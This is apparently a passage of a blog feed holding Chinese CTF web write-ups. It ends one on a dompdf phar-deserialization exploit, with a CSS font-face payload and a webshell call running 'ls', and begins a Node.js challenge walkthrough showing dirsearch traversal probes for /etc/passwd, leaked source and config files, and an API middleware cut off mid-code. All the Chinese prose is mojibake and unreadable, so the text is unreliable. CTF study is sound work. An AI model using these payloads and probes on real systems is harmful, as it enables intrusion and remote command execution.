alt="image-20230426203735353"></p><p>ç„¶åæ¥ç€postç¬¬äºŒä¸ªå‚æ•°</p><p>è§¦å‘phar</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;phar%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fvendor%2Fdompdf%2Fdompdf%2Flib%2Ffonts%2Fexploit_normal_da94a27b825aeca64e86b19a3972972d.ttf%23%23&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åç›´æ¥è®¿é—®1.php?0=lså°±è¡Œäº†</p><p>å‚è€ƒæ–‡ç«  <a href="https://blog.csdn.net/mochu7777777/article/details/130309288?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168251168616800186547875%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168251168616800186547875&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-130309288-null-null.142^v86^control_2,239^v2^insert_chatgpt&amp;utm_term=pdf_converter_revenge&amp;spm=1018.2226.3001.4187">think PHP pdf rce</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ezjxpath&quot;&gt;&lt;a href=&quot;#ezjxpath&quot; class=&quot;headerlink&quot; title=&quot;ezjxpath&quot;&gt;&lt;/a&gt;&lt;strong&gt;ezjxpath&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;cve-2022-41852&lt;/stron</summary>
      
    
    
    
    
    <category term="DASCTF WEB" scheme="https://ke1nys.github.io/tags/DASCTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://ke1nys.github.io/posts/0.html"/>
    <id>https://ke1nys.github.io/posts/0.html</id>
    <published>2023-04-23T07:57:55.724Z</published>
    <updated>2023-04-26T13:05:32.229Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DAS4-ä½ å¬è¯´è¿‡-js-çš„-webshell-å—çš„è§£é¢˜æ€è·¯"><a href="#DAS4-ä½ å¬è¯´è¿‡-js-çš„-webshell-å—çš„è§£é¢˜æ€è·¯" class="headerlink" title="DAS4-ä½ å¬è¯´è¿‡ js çš„ webshell å—çš„è§£é¢˜æ€è·¯"></a>DAS4-ä½ å¬è¯´è¿‡ js çš„ webshell å—çš„è§£é¢˜æ€è·¯</h1><h2 id="é¢˜ç›®ä¿¡æ¯"><a href="#é¢˜ç›®ä¿¡æ¯" class="headerlink" title="é¢˜ç›®ä¿¡æ¯"></a>é¢˜ç›®ä¿¡æ¯</h2><div class="table-container"><table><thead><tr><th>é¢˜ç›®å</th><th>ç±»å‹</th><th>éš¾åº¦</th></tr></thead><tbody><tr><td>DAS4-ä½ å¬è¯´è¿‡ js çš„ webshell å—</td><td>WEB</td><td>å›°éš¾</td></tr></tbody></table></div><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><ul><li>DASCTF{test_flag}</li></ul><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><ol><li>ä»£ç å®¡è®¡ nodejs</li><li>å‘½ä»¤æ‰§è¡Œ</li><li>nodejs æºä»£ç æ³„æ¼</li><li>coding å…¶ä»– git æ‰˜ç®¡å‡­æ®æ³„æ¼</li></ol><h2 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><h3 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h3><p>æ‰“å¼€ç½‘é¡µ</p><p><img src="https://c.img.dasctf.com/images/2023315/1678854079283-9b8e55a1-6827-42f8-9b80-4041b8bfdffa.png" alt="æˆªå±2022-12-03 23.22.05"></p><p>ç›´æ¥æ‰“å¼€ f12 å‘ç° api ä¸æ³¨é‡Š</p><p><img src="https://c.img.dasctf.com/images/2023315/1678854085904-9310bb97-3f6a-4a2a-9a65-dd99779867a7.png" alt="æˆªå±2022-12-03 23.22.45"></p><h3 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h3><p>è¿™é‡Œå…¶å®æƒ³è¯´çš„æ˜¯æ‰«æè¯¥ç½‘ç«™ çœ‹çœ‹æœ‰æ²¡æœ‰å‘ç°</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch -u http://127.0.0.1 <span class="comment"># è¿™é‡Œä¸éœ€è¦å¼•å…¥ä»»ä½•å­—å…¸ æ³„æ¼çš„æ–‡ä»¶ç›¸å½“å¸¸è§</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2.8</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11458</span><br><span class="line"></span><br><span class="line">Output File: /tmp/reports/</span><br><span class="line"></span><br><span class="line">Target: http://127.0.0.1/</span><br><span class="line"></span><br><span class="line">[23:23:56] Starting:</span><br><span class="line">[23:23:56] 403 -    9B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">[23:23:56] 403 -    9B  - /%2e%2e//google.com</span><br><span class="line">[23:23:58] 400 -   14B  - /\..\..\..\..\..\..\..\..\..\etc\passwd</span><br><span class="line">[23:24:00] 200 -  679B  - /app.js</span><br><span class="line">[23:24:01] 403 -    9B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">[23:24:02] 200 -  439B  - /config.js</span><br><span class="line">[23:24:03] 200 -  170B  - /Dockerfile</span><br><span class="line">[23:24:07] 200 -  627B  - /package.json</span><br><span class="line">[23:24:07] 200 -   29KB - /package-lock.json</span><br><span class="line">[23:24:08] 200 -    9B  - /Readme.md</span><br><span class="line">[23:24:08] 200 -    9B  - /README.md</span><br><span class="line">[23:24:08] 200 -    9B  - /README.MD</span><br><span class="line">[23:24:08] 200 -    9B  - /ReadMe.md</span><br><span class="line">[23:24:08] 200 -    9B  - /readme.md</span><br><span class="line">[23:24:12] 200 -    6KB - /views</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure><h3 id="å…¥å£ç‚¹å‘ç°"><a href="#å…¥å£ç‚¹å‘ç°" class="headerlink" title="å…¥å£ç‚¹å‘ç°"></a>å…¥å£ç‚¹å‘ç°</h3><p>å‘ç°å­˜åœ¨ç›¸å…³çš„ js web æ–‡ä»¶ å°è¯•æŸ¥çœ‹æ˜¯å¦æœ‰å…¶ä»–æ³„æ¼ã€‚</p><ul><li><p>app.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Koa</span>        = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyparser = <span class="built_in">require</span>(<span class="string">&#x27;koa-bodyparser&#x27;</span>)()</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span>     = <span class="built_in">require</span>(<span class="string">&#x27;koa-static&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> cors       = <span class="built_in">require</span>(<span class="string">&#x27;./cors&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> template   = <span class="built_in">require</span>(<span class="string">&#x27;./middlewares/template&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> route      = <span class="built_in">require</span>(<span class="string">&#x27;./middlewares/route&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> api        = <span class="built_in">require</span>(<span class="string">&#x27;./middlewares/api&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> listen     = <span class="built_in">require</span>(<span class="string">&#x27;./middlewares/listen&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> production = process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;production&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app        = <span class="keyword">new</span> <span class="title class_">Koa</span>()</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">    .<span class="title function_">use</span>(<span class="title function_">static</span>(<span class="string">&#x27;./&#x27;</span>))</span><br><span class="line">    .<span class="title function_">use</span>(<span class="title function_">template</span>(<span class="string">&#x27;views&#x27;</span>, &#123;</span><br><span class="line">        <span class="comment">// noCache: !production,</span></span><br><span class="line">        <span class="comment">// watch  : !production</span></span><br><span class="line">    &#125;))</span><br><span class="line">    .<span class="title function_">use</span>(bodyparser)</span><br><span class="line">    .<span class="title function_">use</span>(cors)</span><br><span class="line">    .<span class="title function_">use</span>(route)</span><br><span class="line">    .<span class="title function_">use</span>(api)</span><br><span class="line"></span><br><span class="line"><span class="title function_">listen</span>(app)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>package.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;updater&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt; v0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;app.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;axios&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.21.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.13.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa-bodyparser&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.3.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa-router&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^9.1.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa-sslify&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.0.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa-static&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^5.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa2-cors&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.0.6&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;nunjucks&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.2.2&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pm2 start ecosystem.config.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;prod&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pm2 start ecosystem.config.js --env production&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISC&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>Readme</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># updater</span><br></pre></td></tr></table></figure></li><li><p>config.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">CONFIG</span> = &#123;</span><br><span class="line">    <span class="attr">server</span>: &#123;</span><br><span class="line">        <span class="attr">domain</span>: <span class="string">&#x27;test.example.com&#x27;</span>,</span><br><span class="line">        <span class="attr">pact</span>: <span class="string">&#x27;https&#x27;</span>,</span><br><span class="line">        <span class="attr">host</span>: <span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">        <span class="attr">port</span>: <span class="string">&#x27;443&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">coding</span>: &#123;</span><br><span class="line">        <span class="attr">username</span>: <span class="string">&#x27;test@test.com&#x27;</span>,</span><br><span class="line">        <span class="attr">password</span>: <span class="string">&#x27;IAmTheCodeMaster&#x27;</span>,</span><br><span class="line">        <span class="attr">apiKey</span>: <span class="string">&#x27;flag&#123;This is fake flag&#125;:-)&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;development&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable constant_">CONFIG</span>.<span class="property">server</span>.<span class="property">pact</span> = <span class="string">&#x27;http&#x27;</span>,</span><br><span class="line">    <span class="variable constant_">CONFIG</span>.<span class="property">server</span>.<span class="property">port</span> = <span class="string">&#x27;80&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="variable constant_">CONFIG</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæåˆ°äº† coding è¿˜æœ‰ç”¨æˆ·åå¯†ç  ï¼ˆå‡çš„ï¼‰å¹¶ä¸çŸ¥é“ coding æ˜¯ä»€ä¹ˆçš„æƒ…å†µä¸‹ã€‚ ç½‘ç«™ä¹Ÿæ²¡æœ‰ç™»é™†å£ã€‚</p></li><li><p>Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">16</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm install &amp;&amp; npm install -g pm2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">443</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;pm2-runtime&quot;</span>, <span class="string">&quot;/app/ecosystem.config.js&quot;</span>, <span class="string">&quot;--env&quot;</span>, <span class="string">&quot;production&quot;</span>]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>è¿™é‡Œæ‰€æœ‰çš„è¯æ®éƒ½è¯´æ˜äº† è¿™ä¸ªç½‘ç«™æ³„æ¼äº†æºä»£ç  ä¹Ÿå°±æ˜¯ js æ–‡ä»¶ </p><p>æ¥ä¸‹æ¥æµ‹è¯•æ˜¯å¦å­˜åœ¨ ecosystem.config.js æ–‡ä»¶ æ¥éªŒè¯è¿™ä¸ªç»“è®º</p><p>æˆ‘ä»¬å¯ä»¥è¯•è¯• <a href="https://127.0.0.1/ecosystem.config.js">https://127.0.0.1/ecosystem.config.js</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Options reference: https://pm2.keymetrics.io/docs/usage/application-declaration/</span></span><br><span class="line">const package = require(&#x27;./package.json&#x27;)</span><br><span class="line"></span><br><span class="line">module.exports = <span class="punctuation">&#123;</span></span><br><span class="line">    apps<span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">        name               <span class="punctuation">:</span> package.name<span class="punctuation">,</span></span><br><span class="line">        script             <span class="punctuation">:</span> &#x27;app.js&#x27;<span class="punctuation">,</span></span><br><span class="line">        args               <span class="punctuation">:</span> &#x27;one two&#x27;<span class="punctuation">,</span></span><br><span class="line">        instances          <span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        autorestart        <span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        watch              <span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        ignore_watch       <span class="punctuation">:</span> <span class="punctuation">[</span>&#x27;node_modules&#x27;<span class="punctuation">,</span> &#x27;logs&#x27;<span class="punctuation">,</span> &#x27;.git&#x27;<span class="punctuation">,</span> &#x27;statics&#x27;<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        error_file         <span class="punctuation">:</span> &#x27;logs/err.log&#x27;<span class="punctuation">,</span></span><br><span class="line">        out_file           <span class="punctuation">:</span> &#x27;logs/out.log&#x27;<span class="punctuation">,</span></span><br><span class="line">        log_file           <span class="punctuation">:</span> &#x27;logs/all.log&#x27;<span class="punctuation">,</span></span><br><span class="line">        log_date_format    <span class="punctuation">:</span> &#x27;YYYY-MM-DD HH<span class="punctuation">:</span>mm<span class="punctuation">:</span>ss&#x27;<span class="punctuation">,</span></span><br><span class="line">        max_memory_restart <span class="punctuation">:</span> &#x27;<span class="number">1</span>G&#x27;<span class="punctuation">,</span></span><br><span class="line">        env<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            NODE_ENV       <span class="punctuation">:</span> &#x27;development&#x27;<span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        env_production<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            NODE_ENV       <span class="punctuation">:</span> &#x27;production&#x27;<span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    deploy<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        production<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="comment">// host          : CONFIG.remote.host,</span></span><br><span class="line">            <span class="comment">// user          : CONFIG.remote.user,</span></span><br><span class="line">            <span class="comment">// path          : CONFIG.remote.path,</span></span><br><span class="line">            <span class="comment">// repo          : CONFIG.git.ssh,</span></span><br><span class="line">            <span class="comment">// ref           : CONFIG.git.ref,</span></span><br><span class="line">            &#x27;post-deploy&#x27; <span class="punctuation">:</span> &#x27;npm install &amp;&amp; pm2 reload ecosystem.config.js --env production&#x27;</span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span>;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾æ˜¯å­˜åœ¨ js ä»£ç æ³„æ¼çš„</p><h3 id="æ£€æŸ¥-middleware"><a href="#æ£€æŸ¥-middleware" class="headerlink" title="æ£€æŸ¥ middleware"></a>æ£€æŸ¥ middleware</h3><p>é€šè¿‡ app.js æ–‡ä»¶</p><p>å¯ä»¥ç¿»æ‰¾åˆ° å¦‚ä¸‹çš„åº“ä¸ä¸­é—´ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const template   = require(&#x27;./middlewares/template&#x27;)</span><br><span class="line">const route      = require(&#x27;./middlewares/route&#x27;)</span><br><span class="line">const api        = require(&#x27;./middlewares/api&#x27;)</span><br><span class="line">const listen     = require(&#x27;./middlewares/listen&#x27;)</span><br></pre></td></tr></table></figure><p>api listen route template å››ä¸ªåˆ†åˆ«é€šè¿‡ä¾èµ–æ³¨å…¥çš„æ–¹å¼å¼•å…¥</p><p>è¿™é‡Œç›´æ¥å»çœ‹ api </p><p>å¯¹äº api åˆ†åˆ«å°è¯•è¿™ä¸‰ä¸ªæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://127.0.0.1/middlewares/api.js</span><br><span class="line">https://127.0.0.1/middlewares/api</span><br><span class="line">https://127.0.0.1/middlewares/api/index.js</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç° index.js æœ‰è¿”å›</p><p>å¦‚ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs       = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path     = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> router   = <span class="built_in">require</span>(<span class="string">&#x27;koa-router&#x27;</span>)()</span><br><span class="line"><span class="keyword">const</span> tools    = <span class="built_in">require</span>(<span class="string">&#x27;../../utils&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Response</span> = <span class="built_in">require</span>(<span class="string">&#x27;../response&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// apiPath ä¸º å½“å‰ç›®å½•çš„ä¸Šä¸Šçº§ ä¹Ÿå°±æ˜¯ / ä¸‹ æ˜¯å¯ä»¥è®¿é—®çš„</span></span><br><span class="line"><span class="keyword">const</span> apiPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../../api&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿™é‡Œæ˜¯ç½‘ç«™è‡ªå·±å®ç°çš„ CGI </span></span><br><span class="line"><span class="comment">// åŠ¨æ€çš„åœ¨ api æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰çš„ js æ–‡ä»¶æ³¨å†Œè¿›æ¥ å¹¶ä¸”èµ‹äºˆå¯¹åº”çš„ path</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">registeApi</span> (dir) &#123;</span><br><span class="line">    <span class="comment">// éå†ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line">    fs.<span class="title function_">readdirSync</span>(dir).<span class="title function_">forEach</span>(<span class="function"><span class="params">fileName</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// æ–‡ä»¶å®Œæ•´è·¯å¾„</span></span><br><span class="line">        <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(dir, fileName)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è‹¥è¯¥æ–‡ä»¶ä¸ºç›®å½•ï¼Œåˆ™ç»§ç»­éå†è¯¥ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span> (fs.<span class="title function_">statSync</span>(filePath).<span class="title function_">isDirectory</span>()) <span class="keyword">return</span> <span class="title function_">registeApi</span>(filePath)</span><br><span class="line">        <span class="comment">// å¿½ç•¥å…¥å£æ–‡ä»¶</span></span><br><span class="line">        <span class="comment">// if (filePath.endsWith(&#x27;index.js&#x27;))       return</span></span><br><span class="line">        <span class="comment">// å¿½ç•¥é js æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span> (!filePath.<span class="title function_">endsWith</span>(<span class="string">&#x27;.js&#x27;</span>))           <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;é JS æ–‡ä»¶ä¸è¦æ”¾åœ¨ api ç›®å½•ä¸‹&#x27;</span> + filePath)</span><br><span class="line"></span><br><span class="line">        <span class="title function_">regist</span>(filePath);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ³¨å†Œå•ä¸ª api </span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">regist</span>(<span class="params">filePath</span>) &#123;</span><br><span class="line">    <span class="comment">// API</span></span><br><span class="line">    <span 